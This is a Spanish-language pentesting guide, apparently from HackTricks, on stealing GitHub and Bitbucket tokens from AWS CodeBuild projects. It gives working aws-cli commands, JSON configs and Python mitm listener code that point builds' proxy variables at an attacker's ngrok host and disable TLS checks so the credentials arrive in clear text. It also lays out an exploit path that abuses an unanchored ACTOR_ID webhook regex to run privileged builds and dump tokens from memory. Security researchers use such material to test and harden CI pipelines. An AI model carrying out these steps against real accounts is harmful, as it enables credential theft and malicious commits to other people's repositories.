# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Recuperar tokens configurados de Github/Bitbucket

Primero, comprueba si existen credenciales de origen configuradas que puedas leak:
```bash
aws codebuild list-source-credentials
```
### A través de una imagen Docker

Si detectas que la autenticación, por ejemplo a Github, está configurada en la cuenta, puedes **exfiltrate** ese **access** (**GH token or OAuth token**) haciendo que Codebuild **use una imagen Docker específica** para ejecutar la build del proyecto.

Para ello puedes **crear un nuevo proyecto de Codebuild** o cambiar el **entorno** de uno existente para establecer la **imagen Docker**.

The Docker image you could use is [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Esta es una imagen Docker muy básica que establecerá las **variables de entorno `https_proxy`**, **`http_proxy`** y **`SSL_CERT_FILE`**. Esto te permitirá interceptar la mayor parte del tráfico del host indicado en **`https_proxy`** y **`http_proxy`** y confiar en el CERT SSL indicado en **`SSL_CERT_FILE`**.

1. **Crear & subir tu propia imagen Docker MitM**
- Sigue las instrucciones del repo para configurar la dirección IP de tu proxy y establecer tu certificado SSL y **construir la imagen Docker**.
- **NO CONFIGURAR `http_proxy`** para no interceptar las requests al endpoint de metadata.
- Puedes usar **`ngrok`** como `ngrok tcp 4444` para establecer el proxy hacia tu host
- Una vez que tengas la imagen Docker construida, **subirla a un repo público** (Dockerhub, ECR...)
2. **Configurar el entorno**
- Crea un **nuevo proyecto de Codebuild** o **modifica** el entorno de uno existente.
- Configura el proyecto para que use la **imagen Docker generada previamente**

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Configura el proxy MitM en tu host**

- Como indica el **repo de Github** podrías usar algo como:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> La **versión de mitmproxy utilizada fue 9.0.1**, se informó que con la versión 10 esto podría no funcionar.

4. **Ejecutar el build y capturar las credenciales**

- Puedes ver el token en el encabezado **Authorization**:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

Esto también se podría hacer desde el aws cli con algo como
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### Mediante insecureSSL

**Codebuild** projects have a setting called **`insecureSsl`** that is hidden in the web you can only change it from the API.\
Los proyectos de **Codebuild** tienen una opción llamada **`insecureSsl`** que está oculta en la web y solo se puede cambiar desde la API.\
Activarla permite a Codebuild conectarse al repositorio **sin comprobar el certificado** ofrecido por la plataforma.

- Primero necesitas enumerar la configuración actual con algo como:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- Luego, con la información recopilada puedes actualizar la configuración del proyecto **`insecureSsl`** a **`True`**. El siguiente es un ejemplo de mi actualización de un proyecto, fíjate en **`insecureSsl=True`** al final (esto es lo único que necesitas cambiar de la configuración recopilada).
- Además, añade también las variables de entorno **http_proxy** y **https_proxy** apuntando a tu tcp ngrok así:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- Luego, ejecuta el ejemplo básico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) en el puerto indicado por las variables de proxy (http_proxy y https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Finalmente, haga clic en **Build the project**, las **credentials** serán **enviadas en texto claro** (base64) al mitm port:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~A través del protocolo HTTP~~

> [!TIP] > **Esta vulnerabilidad fue corregida por AWS en algún momento de la semana del 20 de febrero de 2023 (creo que el viernes). Así que un atacante ya no puede abusar de ella :)**

Un atacante con **permisos elevados sobre un CodeBuild podría leak el Github/Bitbucket token** configurado o, si los permisos se configuraron vía OAuth, el **temporary OAuth token used to access the code**.

- Un atacante podría añadir las variables de entorno **http_proxy** y **https_proxy** al proyecto CodeBuild apuntando a su máquina (por ejemplo `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- Luego, cambie la URL del repo de github para usar HTTP en lugar de HTTPS, por ejemplo: `http://github.com/carlospolop-forks/TestActions`
- Luego, ejecute el ejemplo básico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) en el puerto indicado por las variables proxy (http_proxy y https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
A continuación, haga clic en **Build the project** o inicie la compilación desde la línea de comandos:
```sh
aws codebuild start-build --project-name <proj-name>
```
- Finalmente, las **credenciales** serán **enviadas en texto claro** (base64) al puerto mitm:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> Ahora un atacante podrá usar el token desde su máquina, listar todos los privilegios que tiene y (ab)usar más fácilmente que usando el servicio CodeBuild directamente.

## Bypass de la allowlist regex ACTOR_ID del filtro de webhook (PR-triggered privileged builds)

Los webhooks de CodeBuild para GitHub mal configurados que usan regex `ACTOR_ID` sin anclar permiten que PRs *no confiables* inicien builds privilegiadas. Si la allowlist es algo como `123456|7890123` sin `^`/`$`, cualquier ID que contenga una de esas subcadenas coincide. Dado que los IDs de usuario de GitHub son secuenciales, un atacante puede competir para registrar un ID eclipsante (una supercadena de un ID confiable) y desencadenar el build.

**Exploit path**

1. Encontrar proyectos públicos de CodeBuild que expongan filtros de webhook y extraer una allowlist `ACTOR_ID` sin anclar.
2. Obtener un GitHub ID eclipsante:
- Muestrear el contador global de IDs creando/eliminando organizaciones de GitHub (los org IDs comparten el pool).
- Pre-crear muchas manifestaciones de GitHub App y activar las URLs de confirmación cuando el contador esté a ~100 IDs del objetivo para registrar en ráfaga un bot ID que contenga la subcadena confiable.
3. Abrir un PR desde la cuenta eclipsante; la regex coincide con la subcadena y se ejecuta el build privilegiado.
4. Usar RCE en el build (p. ej., dependency install hooks) para volcar la memoria del proceso que maneja la credencial de GitHub y recuperar el token PAT/OAuth.
5. Con el scope `repo` del token, invitar tu cuenta como colaborador/administrador y push/approve commits maliciosos o exfiltrar secretos.

## Referencias
- [Wiz: CodeBreach – AWS CodeBuild ACTOR_ID regex bypass and token theft](https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild)

{{#include ../../../../banners/hacktricks-training.md}}
